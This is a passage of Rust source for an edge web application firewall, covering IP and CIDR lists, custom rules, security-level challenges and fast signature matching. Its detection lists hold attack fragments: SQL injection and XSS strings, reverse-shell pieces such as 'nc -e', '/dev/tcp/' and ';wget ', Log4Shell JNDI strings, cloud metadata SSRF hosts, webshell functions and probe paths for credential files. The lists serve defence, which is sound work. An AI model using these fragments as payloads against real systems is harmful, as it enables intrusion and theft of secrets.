//! Lightweight Web Application Firewall evaluated at the edge.
//!
//! Scope (deliberately dependency-free):
//! * IP allow/deny lists (IPv4/IPv6, CIDR);
//! * managed signatures for SQL injection, XSS, path traversal and common
//!   vulnerability scanners;
//! * per-domain custom rules (field + operator + value, block/allow/log).
//!
//! The body is not inspected: WAF runs before the proxy reads a request body,
//! and CDN traffic is dominated by GET/HEAD. Managed checks cover the
//! path/query/UA/referer, which is where most automated attacks show up.

pub mod geo;
pub mod rulepack;

use aho_corasick::AhoCorasick;
use axum::http::HeaderMap;
use std::borrow::Cow;
use std::collections::HashMap;
use std::net::IpAddr;
use std::sync::OnceLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum WafMode {
    /// Record matches but let traffic through (rollout / tuning).
    Monitor,
    /// Reject matched traffic with the WAF block page.
    #[default]
    Block,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WafAction {
    Block,
    Allow,
    Log,
    /// Serve a JS proof-of-work challenge; a signed clearance cookie lets the
    /// client through on subsequent requests.
    Challenge,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum WafField {
    Path,
    Query,
    UserAgent,
    Referer,
    Method,
    Ip,
    /// Arbitrary request header (`header:x-api-key`).
    Header(String),
}

impl WafField {
    pub fn parse(s: &str) -> Option<Self> {
        let s = s.trim().to_ascii_lowercase();
        if let Some(name) = s.strip_prefix("header:") {
            let name = name.trim();
            if name.is_empty() || name.len() > 64 {
                return None;
            }
            return Some(WafField::Header(name.to_string()));
        }
        match s.as_str() {
            "path" | "uri" => Some(WafField::Path),
            "query" | "args" => Some(WafField::Query),
            "user_agent" | "user-agent" | "ua" => Some(WafField::UserAgent),
            "referer" | "referrer" => Some(WafField::Referer),
            "method" => Some(WafField::Method),
            "ip" => Some(WafField::Ip),
            _ => None,
        }
    }
}

/// Cloudflare-style security level applied after explicit rules.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum SecurityLevel {
    #[default]
    Off,
    Low,
    Medium,
    High,
    UnderAttack,
}

impl SecurityLevel {
    pub fn parse(s: &str) -> Self {
        match s.trim().to_ascii_lowercase().as_str() {
            "low" => SecurityLevel::Low,
            "medium" | "mid" => SecurityLevel::Medium,
            "high" => SecurityLevel::High,
            "under_attack" | "underattack" | "attack" => SecurityLevel::UnderAttack,
            _ => SecurityLevel::Off,
        }
    }

    pub fn label(self) -> &'static str {
        match self {
            SecurityLevel::Off => "关闭",
            SecurityLevel::Low => "低",
            SecurityLevel::Medium => "中",
            SecurityLevel::High => "高",
            SecurityLevel::UnderAttack => "攻击中",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WafOp {
    Contains,
    Equals,
    Prefix,
    Suffix,
    /// CIDR membership; only used by the DSL and only for the IP field.
    In,
}

impl WafOp {
    pub fn parse(s: &str) -> Option<Self> {
        match s.trim().to_ascii_lowercase().as_str() {
            "contains" => Some(WafOp::Contains),
            "equals" | "eq" => Some(WafOp::Equals),
            "prefix" | "starts_with" => Some(WafOp::Prefix),
            "suffix" | "ends_with" => Some(WafOp::Suffix),
            _ => None,
        }
    }

    fn matches(self, haystack: &str, needle: &str) -> bool {
        match self {
            WafOp::Contains => haystack.contains(needle),
            WafOp::Equals => haystack == needle,
            WafOp::Prefix => haystack.starts_with(needle),
            WafOp::Suffix => haystack.ends_with(needle),
            WafOp::In => false,
        }
    }
}

#[derive(Debug, Clone)]
pub struct WafRule {
    pub name: String,
    pub field: WafField,
    pub op: WafOp,
    /// Lower-cased at construction time.
    pub value: String,
    pub action: WafAction,
    pub priority: i32,
    pub enabled: bool,
    /// Optional parsed boolean DSL; supersedes field/op/value.
    pub expr: Option<lagran_waf_dsl::Expr>,
}

/// Static data extracted from custom rules when a domain snapshot is loaded.
///
/// This keeps CIDR parsing and header lookup preparation out of the request
/// path while preserving the public rule representation used by callers.
#[doc(hidden)]
#[derive(Debug, Clone, Default)]
pub struct WafCompiled {
    header_names: Vec<String>,
    cidrs: HashMap<String, Vec<IpNet>>,
    managed: Option<&'static ManagedMatchers>,
}

impl WafCompiled {
    fn compile(rules: &[WafRule]) -> Self {
        let matchers = managed_matchers();
        let mut compiled = Self {
            managed: Some(matchers),
            ..Self::default()
        };
        for rule in rules {
            if let Some(expr) = &rule.expr {
                compiled.add_expr(expr);
            } else if let WafField::Header(name) = &rule.field {
                compiled.add_header(name);
            }
        }
        compiled
    }

    fn add_header(&mut self, name: &str) {
        let name = name.trim().to_ascii_lowercase();
        if !name.is_empty() && !self.header_names.contains(&name) {
            self.header_names.push(name);
        }
    }

    fn add_expr(&mut self, expr: &lagran_waf_dsl::Expr) {
        match expr {
            lagran_waf_dsl::Expr::Condition { field, op, value } => {
                if let lagran_waf_dsl::Field::Header(name) = field {
                    self.add_header(name);
                }
                if *op == lagran_waf_dsl::Op::In {
                    self.cidrs.entry(value.clone()).or_insert_with(|| {
                        value
                            .split(',')
                            .filter_map(IpNet::parse)
                            .collect::<Vec<_>>()
                    });
                }
            }
            lagran_waf_dsl::Expr::And(parts) | lagran_waf_dsl::Expr::Or(parts) => {
                for part in parts {
                    self.add_expr(part);
                }
            }
            lagran_waf_dsl::Expr::Not(inner) => self.add_expr(inner),
        }
    }
}

/// Precompiled managed-signature matchers, built once and shared by every
/// domain snapshot.
///
/// The original evaluator ran every scanner signature through a separate
/// `contains` call. That cost grows with the signature list and is paid by
/// clean requests too. Scanner signatures never span component separators, so
/// they can be merged safely. General managed rules are split into literal
/// signatures that can share the same matcher and signatures that contain a
/// logical separator, which keep the existing cross-component path.
#[derive(Debug)]
struct ManagedMatchers {
    scanner_ua: AhoCorasick,
    scanner_path: AhoCorasick,
    full_plain: AhoCorasick,
    full_plain_groups: Vec<ManagedPlainGroup>,
    full_joined_groups: Vec<(ManagedGroup, &'static [&'static str])>,
    url_plain: AhoCorasick,
    url_plain_groups: Vec<ManagedPlainGroup>,
    url_joined_groups: Vec<(ManagedGroup, &'static [&'static str])>,
}

#[derive(Debug, Clone, Copy)]
enum ManagedGroup {
    Sqli,
    Xss,
    Traversal,
    Rce,
    Log4Shell,
    Ssrf,
    Xxe,
    Ssti,
    NoSql,
    Ldap,
    Java,
    Webshell,
}

impl ManagedGroup {
    fn bit(self) -> u16 {
        1 << self as u8
    }

    fn verdict(self) -> WafVerdict {
        match self {
            ManagedGroup::Sqli => verdict("SQL 注入", "sqli"),
            ManagedGroup::Xss => verdict("XSS 跨站脚本", "xss"),
            ManagedGroup::Traversal => verdict("路径穿越", "traversal"),
            ManagedGroup::Rce => verdict("命令执行", "rce"),
            ManagedGroup::Log4Shell => verdict("Log4Shell", "log4shell"),
            ManagedGroup::Ssrf => verdict("SSRF / 云元数据", "ssrf"),
            ManagedGroup::Xxe => verdict("XXE 外部实体", "xxe"),
            ManagedGroup::Ssti => verdict("模板注入 SSTI", "ssti"),
            ManagedGroup::NoSql => verdict("NoSQL 注入", "nosql"),
            ManagedGroup::Ldap => verdict("LDAP 注入", "ldap"),
            ManagedGroup::Java => verdict("Java 反序列化 / OGNL", "java"),
            ManagedGroup::Webshell => verdict("WebShell / PHP 注入", "webshell"),
        }
    }
}

impl ManagedMatchers {
    fn build() -> Self {
        let mut full_patterns: Vec<&'static str> = Vec::new();
        let mut full_groups: Vec<(ManagedGroup, std::ops::Range<usize>)> = Vec::new();
        let mut full_joined_groups: Vec<(ManagedGroup, &'static [&'static str])> = Vec::new();
        let mut url_patterns: Vec<&'static str> = Vec::new();
        let mut url_groups: Vec<(ManagedGroup, std::ops::Range<usize>)> = Vec::new();
        let mut url_joined_groups: Vec<(ManagedGroup, &'static [&'static str])> = Vec::new();

        macro_rules! compile_group {
            ($group:expr, $signatures:expr, $joined:expr, $url_only:expr) => {{
                let (plain, joined): (Vec<&'static str>, Vec<&'static str>) = $signatures
                    .iter()
                    .copied()
                    .partition(|signature| !needs_boundary_scan(signature, $joined));
                if !plain.is_empty() {
                    if $url_only {
                        url_patterns.extend(plain.iter().copied());
                        url_groups
                            .push(($group, url_patterns.len() - plain.len()..url_patterns.len()));
                    } else {
                        full_patterns.extend(plain.iter().copied());
                        full_groups.push((
                            $group,
                            full_patterns.len() - plain.len()..full_patterns.len(),
                        ));
                    }
                }
                if !joined.is_empty() {
                    // Push only the signatures that actually need a boundary scan.
                    // This used to push `$signatures` (the whole list), so every
                    // request walked all of them and re-filtered per signature,
                    // which is most of the managed-rule cost on a clean request.
                    let joined: &'static [&'static str] = Box::leak(joined.into_boxed_slice());
                    if $url_only {
                        url_joined_groups.push(($group, joined));
                    } else {
                        full_joined_groups.push(($group, joined));
                    }
                }
            }};
        }

        compile_group!(ManagedGroup::Sqli, SQLI, true, false);
        compile_group!(ManagedGroup::Xss, XSS, true, false);
        compile_group!(ManagedGroup::Traversal, TRAVERSAL, true, false);
        compile_group!(ManagedGroup::Rce, RCE, true, false);
        compile_group!(ManagedGroup::Log4Shell, LOG4SHELL, true, false);
        compile_group!(ManagedGroup::Ssrf, SSRF, false, true);
        compile_group!(ManagedGroup::Xxe, XXE, true, false);
        compile_group!(ManagedGroup::Ssti, SSTI, true, false);
        compile_group!(ManagedGroup::NoSql, NOSQL, false, true);
        compile_group!(ManagedGroup::Ldap, LDAP, true, false);
        compile_group!(ManagedGroup::Java, JAVA, true, false);
        compile_group!(ManagedGroup::Webshell, WEBSHELL, true, false);

        Self {
            scanner_ua: AhoCorasick::new(SCANNER_UA).expect("static scanner signatures"),
            scanner_path: AhoCorasick::new(SCANNER_PATH).expect("static scanner paths"),
            full_plain: AhoCorasick::new(full_patterns).expect("static managed signatures"),
            full_plain_groups: into_plain_groups(full_groups),
            full_joined_groups,
            url_plain: AhoCorasick::new(url_patterns).expect("static URL signatures"),
            url_plain_groups: into_plain_groups(url_groups),
            url_joined_groups,
        }
    }

    fn full_plain_hits(&self, haystack: &str) -> u16 {
        plain_hits(&self.full_plain, &self.full_plain_groups, haystack)
    }

    fn url_plain_hits(&self, haystack: &str) -> u16 {
        plain_hits(&self.url_plain, &self.url_plain_groups, haystack)
    }

    fn full_joined_hits(&self, parts: &[&str], separators: &[char]) -> u16 {
        joined_hits(&self.full_joined_groups, parts, separators)
    }

    fn url_joined_hits(&self, parts: &[&str], separators: &[char]) -> u16 {
        joined_hits(&self.url_joined_groups, parts, separators)
    }

    /// Whether any managed signature in `enabled` can only match across a
    /// component boundary. The request path can then skip the plain matcher
    /// entirely when those are the only enabled categories.
    fn has_plain_patterns(&self, enabled: impl Fn(ManagedGroup) -> bool) -> bool {
        self.full_plain_groups
            .iter()
            .any(|group| enabled(group.group))
            || self
                .url_plain_groups
                .iter()
                .any(|group| enabled(group.group))
    }
}

fn into_plain_groups(
    groups: Vec<(ManagedGroup, std::ops::Range<usize>)>,
) -> Vec<ManagedPlainGroup> {
    groups
        .into_iter()
        .map(|(group, range)| ManagedPlainGroup { group, range })
        .collect()
}

fn plain_hits(matcher: &AhoCorasick, groups: &[ManagedPlainGroup], haystack: &str) -> u16 {
    let mut hits = 0u16;
    for hit in matcher.find_overlapping_iter(haystack) {
        let pattern = hit.pattern().as_usize();
        if let Some(group) = groups.iter().find(|group| group.range.contains(&pattern)) {
            hits |= group.group.bit();
        }
        if hits == u16::MAX {
            break;
        }
    }
    hits
}

fn joined_hits(
    groups: &[(ManagedGroup, &'static [&'static str])],
    parts: &[&str],
    separators: &[char],
) -> u16 {
    let mut hits = 0u16;
    for (group, signatures) in groups {
        for signature in signatures.iter() {
            if !needs_boundary_scan(signature, true) {
                continue;
            }
            if contains_joined(parts, separators, signature) {
                hits |= group.bit();
                break;
            }
        }
    }
    hits
}

#[derive(Debug, Clone)]
struct ManagedPlainGroup {
    group: ManagedGroup,
    range: std::ops::Range<usize>,
}

fn needs_boundary_scan(signature: &str, full_scan: bool) -> bool {
    full_scan && signature.bytes().any(|byte| byte == b'?' || byte == b' ')
}

fn managed_matchers() -> &'static ManagedMatchers {
    static MATCHERS: OnceLock<ManagedMatchers> = OnceLock::new();
    MATCHERS.get_or_init(ManagedMatchers::build)
}

#[derive(Debug, Clone, Copy)]
pub struct ManagedRules {
    pub sqli: bool,
    pub xss: bool,
    pub traversal: bool,
    pub scanners: bool,
    pub rce: bool,
    pub ssrf: bool,
    pub xxe: bool,
    pub log4shell: bool,
    pub crlf: bool,
    pub ssti: bool,
    pub nosql: bool,
    pub ldap: bool,
    pub java: bool,
    pub webshell: bool,
    pub protocol: bool,
}

impl Default for ManagedRules {
    fn default() -> Self {
        Self {
            sqli: true,
            xss: true,
            traversal: true,
            scanners: true,
            rce: true,
            ssrf: true,
            xxe: true,
            log4shell: true,
            crlf: true,
            ssti: true,
            nosql: true,
            ldap: true,
            java: true,
            webshell: true,
            protocol: true,
        }
    }
}

/// IPv4/IPv6 network with a CIDR prefix.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct IpNet {
    addr: IpAddr,
    prefix: u8,
}

impl IpNet {
    pub fn parse(input: &str) -> Option<Self> {
        let input = input.trim();
        if input.is_empty() {
            return None;
        }
        let (addr_part, prefix_part) = match input.split_once('/') {
            Some((a, p)) => (a, Some(p)),
            None => (input, None),
        };
        let addr: IpAddr = addr_part.parse().ok()?;
        let max = if addr.is_ipv4() { 32 } else { 128 };
        let prefix = match prefix_part {
            Some(p) => p.trim().parse::<u8>().ok()?,
            None => max,
        };
        if prefix > max {
            return None;
        }
        Some(Self { addr, prefix })
    }

    pub fn contains(&self, ip: IpAddr) -> bool {
        match (self.addr, ip) {
            (IpAddr::V4(net), IpAddr::V4(ip)) => {
                let mask = if self.prefix == 0 {
                    0
                } else {
                    u32::MAX << (32 - self.prefix)
                };
                (u32::from(net) & mask) == (u32::from(ip) & mask)
            }
            (IpAddr::V6(net), IpAddr::V6(ip)) => {
                let mask = if self.prefix == 0 {
                    0
                } else {
                    u128::MAX << (128 - self.prefix)
                };
                (u128::from(net) & mask) == (u128::from(ip) & mask)
            }
            _ => false,
        }
    }
}

pub fn parse_ip(input: &str) -> Option<IpAddr> {
    let input = input.trim();
    // Bracket form is common in Host headers, not here; keep strict.
    input.parse::<IpAddr>().ok()
}

#[derive(Debug, Clone)]
pub struct WafConfig {
    pub enabled: bool,
    pub mode: WafMode,
    pub managed: ManagedRules,
    pub rules: Vec<WafRule>,
    pub ip_allow: Vec<IpNet>,
    pub ip_deny: Vec<IpNet>,
    /// ISO 3166-1 alpha-2 country codes that may pass the Geo/ASN gate.
    pub country_allow: Vec<String>,
    /// Country codes blocked outright (takes precedence over allow).
    pub country_deny: Vec<String>,
    /// Autonomous system numbers that may pass the Geo/ASN gate.
    pub asn_allow: Vec<u32>,
    /// ASNs blocked outright (takes precedence over allow).
    pub asn_deny: Vec<u32>,
    /// Number of leading hex zeroes the challenge hash must have (1..=6).
    pub challenge_difficulty: u8,
    /// How long a solved challenge keeps the client cleared (seconds).
    pub challenge_ttl_secs: u64,
    /// Challenge policy applied after explicit rules.
    pub security_level: SecurityLevel,
    #[doc(hidden)]
    pub compiled: WafCompiled,
}

impl Default for WafConfig {
    fn default() -> Self {
        Self {
            enabled: false,
            mode: WafMode::Block,
            managed: ManagedRules::default(),
            rules: Vec::new(),
            ip_allow: Vec::new(),
            ip_deny: Vec::new(),
            country_allow: Vec::new(),
            country_deny: Vec::new(),
            asn_allow: Vec::new(),
            asn_deny: Vec::new(),
            challenge_difficulty: 4,
            challenge_ttl_secs: 1800,
            security_level: SecurityLevel::Off,
            compiled: WafCompiled::default(),
        }
    }
}

impl WafConfig {
    /// True when this domain configured any Geo/ASN rule, so the request path
    /// only pays for a MaxMind lookup when it can matter.
    pub fn needs_geo(&self) -> bool {
        !self.country_allow.is_empty()
            || !self.country_deny.is_empty()
            || !self.asn_allow.is_empty()
            || !self.asn_deny.is_empty()
    }

    /// True when a Geo/ASN allow-list gate is active.
    pub fn has_geo_allow(&self) -> bool {
        !self.country_allow.is_empty() || !self.asn_allow.is_empty()
    }

    /// Sort the rule list once at configuration time.
    ///
    /// The evaluator used to filter and sort a fresh `Vec` on every request.
    /// Config construction is the right place for that work: rules are static
    /// between config syncs.
    pub fn finalize(&mut self) {
        self.rules.retain(|rule| rule.enabled);
        // Highest priority first; ties keep declaration order (stable sort).
        self.rules
            .sort_by_key(|rule| std::cmp::Reverse(rule.priority));
        self.compiled = WafCompiled::compile(&self.rules);
    }

    /// Whether [`WafConfig::finalize`] already prepared `rules` for the hot
    /// path (sorted by descending priority, no disabled entries).
    fn rules_are_finalized(&self) -> bool {
        self.rules.iter().all(|rule| rule.enabled)
            && self
                .rules
                .windows(2)
                .all(|pair| pair[0].priority >= pair[1].priority)
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct WafVerdict {
    pub action: WafAction,
    pub rule_name: String,
    /// sqli / xss / traversal / scanners / ip_deny / custom
    pub category: String,
}

impl WafVerdict {
    pub fn is_block(&self) -> bool {
        self.action == WafAction::Block
    }
}

/// Request view used by the evaluator (already decoded where needed).
pub struct WafRequest<'a> {
    pub method: &'a str,
    pub path: &'a str,
    pub query: &'a str,
    pub user_agent: &'a str,
    pub referer: &'a str,
    pub ip: Option<IpAddr>,
    /// Country code resolved from the trusted client IP, when a database is
    /// loaded and the address is present in it.
    pub country: Option<&'a str>,
    /// Autonomous system number resolved the same way.
    pub asn: Option<u32>,
    pub headers: &'a HeaderMap,
}

const SQLI: &[&str] = &[
    "union select",
    "union/**/select",
    "union all select",
    "' or '1'='1",
    "\" or \"1\"=\"1",
    "or 1=1--",
    "and 1=1--",
    "or true--",
    "or 1=1#",
    "or 1=1/*",
    "union select null",
    "information_schema",
    "sleep(",
    "pg_sleep(",
    "waitfor delay",
    "benchmark(",
    "extractvalue(",
    "updatexml(",
    "load_file(",
    "';drop table",
    "' or 1=1",
];

const XSS: &[&str] = &[
    "<script",
    "</script",
    "javascript:",
    "onerror=",
    "onload=",
    "onmouseover=",
    "onfocus=",
    "onclick=",
    "<iframe",
    "<svg",
    "<img",
    "srcdoc=",
    "document.cookie",
    "data:text/html",
    "&#x3c;script",
    "&lt;script",
];

const TRAVERSAL: &[&str] = &[
    "../",
    "..\\",
    "....//",
    "..%2f",
    "..%5c",
    "%2e%2e",
    "%2e%2e%2f",
    "/etc/passwd",
    "/etc/shadow",
    "boot.ini",
    "win.ini",
];

const SCANNER_UA: &[&str] = &[
    "sqlmap",
    "nikto",
    "nmap",
    "masscan",
    "acunetix",
    "nessus",
    "dirbuster",
    "zgrab",
    "wpscan",
    "nuclei",
    "ffuf",
    "gobuster",
    "feroxbuster",
    "whatweb",
    "w3af",
    "commix",
    "xsstrike",
    "arachni",
    "openvas",
    "zaproxy",
    "zap/",
];

const SCANNER_PATH: &[&str] = &[
    "/.env",
    "/.git/",
    "/.svn/",
    "/.aws/credentials",
    "/.kube/config",
    "/.ssh/",
    "/id_rsa",
    "/wp-login.php",
    "/wp-admin",
    "/phpmyadmin",
    "/actuator",
    "/server-status",
    "/.DS_Store",
    "/web.config",
    "/config.php",
    "/docker-compose.yml",
    "/dockerfile",
    "/backup.sql",
    "/.sql",
    "/.bak",
];

const RCE: &[&str] = &[
    ";wget ",
    ";curl ",
    ";nc ",
    ";bash",
    ";sh",
    "|bash",
    "|sh",
    "/bin/sh",
    "/bin/bash",
    "cmd.exe",
    "powershell",
    "nc -e",
    "bash -i",
    "sh -c",
    "cmd=",
    "exec(",
    "system(",
    "$(",
    "/dev/tcp/",
    "mkfifo",
    "perl -e",
    "python -c",
    "ruby -e",
    "${ifs}",
    "$ifs",
    "bash -c",
];

const SSRF: &[&str] = &[
    "169.254.169.254",
    "169.254.169.253",
    "metadata.google.internal",
    "metadata.tencentyun.com",
    "metadata.azure.com",
    "metadata.aliyun.com",
    "100.100.100.200",
    "kubernetes.default.svc",
    "file://",
    "gopher://",
    "dict://",
    "ftp://",
    "ldap://",
    "ldaps://",
    "rmi://",
    "http://169.254.169.254",
    "127.0.0.1",
    "localhost",
    "[::1]",
    "0.0.0.0",
];

const XXE: &[&str] = &[
    "<!doctype",
    "<!entity",
    "system \"",
    "system '",
    "public \"",
    "public '",
    "file:///etc",
    "expect://",
    "jar://",
    "expect(",
];

const LOG4SHELL: &[&str] = &[
    "${jndi:",
    "jndi:ldap",
    "jndi:ldaps",
    "jndi:rmi",
    "jndi:dns",
    "jndi:iiop",
    "jndi:corba",
    "${lower:j",
    "${upper:j",
];

const SSTI: &[&str] = &[
    "{{7*7}}",
    "{{7*'7'}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "<%=7*7%>",
    "{{config",
    "{{self.",
    "{{cycler",
    "{{lipsum",
    "__class__",
    "__mro__",
    "__subclasses__",
    "freemarker.template",
    "org.apache.velocity",
    "#set(",
    "getengine(",
    "runtime.exec",
];

const NOSQL: &[&str] = &[
    "$ne",
    "$gt",
    "$gte",
    "$lt",
    "$lte",
    "$regex",
    "$where",
    "$exists",
    "$jsonschema",
    "\"$ne\"",
    "\"$gt\"",
    "';return true;var a='",
    "' || '1'=='1",
];

const LDAP: &[&str] = &["*)(uid=*", "*)(cn=*", ")(|(", ")(&(", "objectclass=*"];

const JAVA: &[&str] = &[
    "java.lang.runtime",
    "java.lang.processbuilder",
    "processbuilder",
    "getruntime().exec",
    "ognl",
    "struts",
    "%{#",
    "_memberaccess",
    "class.module.classloader",
];

const WEBSHELL: &[&str] = &[
    "<?php",
    "<?=",
    "php://",
    "php://filter",
    "auto_prepend_file",
    "auto_append_file",
    "$_get[",
    "$_post[",
    "$_request[",
    "$_cookie[",
    "eval(",
    "assert(",
    "base64_decode(",
    "gzinflate(",
    "str_rot13(",
    "c99shell",
    "r57shell",
    "weevely",
    "preg_replace(\"/e\"",
];

/// Static assets are never challenged by security levels.
const STATIC_EXT: &[&str] = &[
    ".css", ".js", ".mjs", ".map", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".ico",
    ".woff", ".woff2", ".ttf", ".otf", ".eot", ".mp4", ".webm", ".mp3", ".webp", ".avif",
];

fn is_static_asset(path: &str) -> bool {
    let last = path.rsplit('/').next().unwrap_or("");
    if !last.contains('.') {
        return false;
    }
    let ext = format!(
        ".{}",
        last.rsplit('.').next().unwrap_or("").to_ascii_lowercase()
    );
    STATIC_EXT.contains(&ext.as_str())
}

fn looks_like_document(headers: &HeaderMap, path: &str) -> bool {
    let accept = headers
        .get("accept")
        .and_then(|v| v.to_str().ok())
        .unwrap_or("")
        .to_ascii_lowercase();
    if accept.contains("text/html") {
        return true;
    }
    if path.ends_with('/') {
        return true;
    }
    let last = path.rsplit('/').next().unwrap_or("");
    !last.contains('.')
}

fn header_value(headers: &HeaderMap, name: &str) -> String {
    headers
        .get(name)
        .and_then(|v| v.to_str().ok())
        .map(decode_lower)
        .unwrap_or_default()
        .into_owned()
}

fn level_verdict(
    level: SecurityLevel,
    method: &str,
    path: &str,
    ua: &str,
    headers: &HeaderMap,
) -> Option<WafVerdict> {
    if level == SecurityLevel::Off {
        return None;
    }
    if !method.eq_ignore_ascii_case("GET") && !method.eq_ignore_ascii_case("HEAD") {
        return None;
    }
    if is_static_asset(path) {
        return None;
    }
    let empty_ua = ua.trim().is_empty();
    let suspicious_ua = empty_ua || contains_any(ua, SCANNER_UA);
    let trigger = match level {
        SecurityLevel::Low => empty_ua,
        SecurityLevel::Medium => suspicious_ua,
        SecurityLevel::High => looks_like_document(headers, path),
        SecurityLevel::UnderAttack => true,
        SecurityLevel::Off => false,
    };
    if !trigger {
        return None;
    }
    Some(WafVerdict {
        action: WafAction::Challenge,
        rule_name: format!("安全级别 · {}", level.label()),
        category: "security_level".into(),
    })
}

/// Percent-decode then lower-case (ASCII). Invalid escapes are kept verbatim.
pub fn decode_lower(input: &str) -> Cow<'_, str> {
    decode_lower_once(input)
}

/// Whether a single pass of [`decode_lower_once`] would change the input.
///
/// Paths, queries and header values are overwhelmingly already lower-case and
/// escape-free, so the common case can borrow instead of allocating. The check
/// and the transform are fused into one scan to avoid reading the input twice.
fn needs_decode_lower(input: &str) -> bool {
    input.bytes().any(|b| b == b'%' || b.is_ascii_uppercase())
}

fn decode_lower_once(input: &str) -> Cow<'_, str> {
    if !needs_decode_lower(input) {
        return Cow::Borrowed(input);
    }
    let bytes = input.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            let hi = (bytes[i + 1] as char).to_digit(16);
            let lo = (bytes[i + 2] as char).to_digit(16);
            if let (Some(hi), Some(lo)) = (hi, lo) {
                out.push((hi * 16 + lo) as u8);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    Cow::Owned(String::from_utf8_lossy(&out).to_ascii_lowercase())
}

/// Decode twice so `%2527`/`%253Cscript%253E` cannot hide behind one layer of
/// encoding. Only decode a second time when the first pass still contains `%`,
/// keeping normal requests cheap.
fn decode_lower_twice(input: &str) -> Cow<'_, str> {
    let once = decode_lower_once(input);
    if once.contains('%') {
        // The second pass may borrow from `once`, which is local: own it.
        Cow::Owned(decode_lower_once(&once).into_owned())
    } else {
        once
    }
}

fn contains_any(haystack: &str, needles: &[&str]) -> bool {
    needles.iter().any(|n| haystack.contains(n))
}

/// Evaluate all merged managed groups and return the first verdict in the
/// historical category order.
///
/// The order is part of the observable result when a request matches several
/// categories, so it must not depend on matcher internals. Scanner checks sit
/// between traversal and RCE in that order and remain a separate decision
/// because they read different inputs.
fn managed_verdict(
    cfg: &WafConfig,
    parts: &[&str],
    full_separators: &[char],
    url_separators: &[char],
    ua: &str,
    path: &str,
) -> Option<WafVerdict> {
    let Some(matchers) = cfg.compiled.managed else {
        return legacy_managed_verdict(cfg, parts, full_separators, url_separators, ua, path);
    };

    let enabled_in_config = |group: ManagedGroup| match group {
        ManagedGroup::Sqli => cfg.managed.sqli,
        ManagedGroup::Xss => cfg.managed.xss,
        ManagedGroup::Traversal => cfg.managed.traversal,
        ManagedGroup::Rce => cfg.managed.rce,
        ManagedGroup::Log4Shell => cfg.managed.log4shell,
        ManagedGroup::Ssrf => cfg.managed.ssrf,
        ManagedGroup::Xxe => cfg.managed.xxe,
        ManagedGroup::Ssti => cfg.managed.ssti,
        ManagedGroup::NoSql => cfg.managed.nosql,
        ManagedGroup::Ldap => cfg.managed.ldap,
        ManagedGroup::Java => cfg.managed.java,
        ManagedGroup::Webshell => cfg.managed.webshell,
    };

    let url_parts = &parts[..2];
    // `find_overlapping_iter` reports a match for every pattern ending at the
    // same offset, so four component scans plus the URL scan cover every plain
    // signature. The boundary path is only needed for signatures containing a
    // logical separator.
    let mut hits = if matchers.has_plain_patterns(enabled_in_config) {
        let mut hits = matchers.full_plain_hits(parts[0]);
        hits |= matchers.full_plain_hits(parts[1]);
        hits |= matchers.full_plain_hits(parts[2]);
        hits |= matchers.full_plain_hits(parts[3]);
        hits |= matchers.url_plain_hits(url_parts[0]);
        hits |= matchers.url_plain_hits(url_parts[1]);
        hits
    } else {
        0
    };
    if !matchers.full_joined_groups.is_empty() || !matchers.url_joined_groups.is_empty() {
        hits |= matchers.full_joined_hits(parts, full_separators);
        hits |= matchers.url_joined_hits(url_parts, url_separators);
    }
    // A sensitive path such as `/.git/config` matches no injection signature, so
    // `hits` is zero. The `hits == 0` shortcut below returned before the scanner
    // check ran, which made every path-only scanner rule dead on the finalised
    // (production) path — the legacy path still caught them, which is why the
    // unfinalised unit tests passed. Scanner detection is therefore evaluated
    // here, but *after* the injection groups have had their chance, so a request
    // that also carries an injection payload is still reported as the more
    // severe category.
    let scanner_hit = cfg.managed.scanners
        && (matchers.scanner_ua.is_match(ua) || matchers.scanner_path.is_match(path));
    if hits == 0 {
        return scanner_hit.then(|| verdict("恶意扫描器", "scanners"));
    }

    let enabled = |group: ManagedGroup| enabled_in_config(group) && hits & group.bit() != 0;

    for group in [
        ManagedGroup::Sqli,
        ManagedGroup::Xss,
        ManagedGroup::Traversal,
    ] {
        if enabled(group) {
            return Some(group.verdict());
        }
    }
    if scanner_hit {
        return Some(verdict("恶意扫描器", "scanners"));
    }
    for group in [
        ManagedGroup::Rce,
        ManagedGroup::Log4Shell,
        ManagedGroup::Ssrf,
        ManagedGroup::Xxe,
        ManagedGroup::Ssti,
        ManagedGroup::NoSql,
        ManagedGroup::Ldap,
        ManagedGroup::Java,
        ManagedGroup::Webshell,
    ] {
        if enabled(group) {
            return Some(group.verdict());
        }
    }
    None
}

/// Slow path for configs constructed outside `finalize` (tests and direct
/// callers). It must remain semantically identical to the merged matcher.
fn legacy_managed_verdict(
    cfg: &WafConfig,
    parts: &[&str],
    full_separators: &[char],
    url_separators: &[char],
    ua: &str,
    path: &str,
) -> Option<WafVerdict> {
    if cfg.managed.sqli && contains_any_joined(parts, full_separators, SQLI) {
        return Some(verdict("SQL 注入", "sqli"));
    }
    if cfg.managed.xss && contains_any_joined(parts, full_separators, XSS) {
        return Some(verdict("XSS 跨站脚本", "xss"));
    }
    if cfg.managed.traversal && contains_any_joined(parts, full_separators, TRAVERSAL) {
        return Some(verdict("路径穿越", "traversal"));
    }
    if cfg.managed.scanners {
        if contains_any(ua, SCANNER_UA) {
            return Some(verdict("恶意扫描器", "scanners"));
        }
        if contains_any(path, SCANNER_PATH) {
            return Some(verdict("敏感路径探测", "scanners"));
        }
    }
    if cfg.managed.rce && contains_any_joined(parts, full_separators, RCE) {
        return Some(verdict("命令执行", "rce"));
    }
    if cfg.managed.log4shell && contains_any_joined(parts, full_separators, LOG4SHELL) {
        return Some(verdict("Log4Shell", "log4shell"));
    }
    if cfg.managed.ssrf && contains_any_joined(&parts[..2], url_separators, SSRF) {
        return Some(verdict("SSRF / 云元数据", "ssrf"));
    }
    if cfg.managed.xxe && contains_any_joined(parts, full_separators, XXE) {
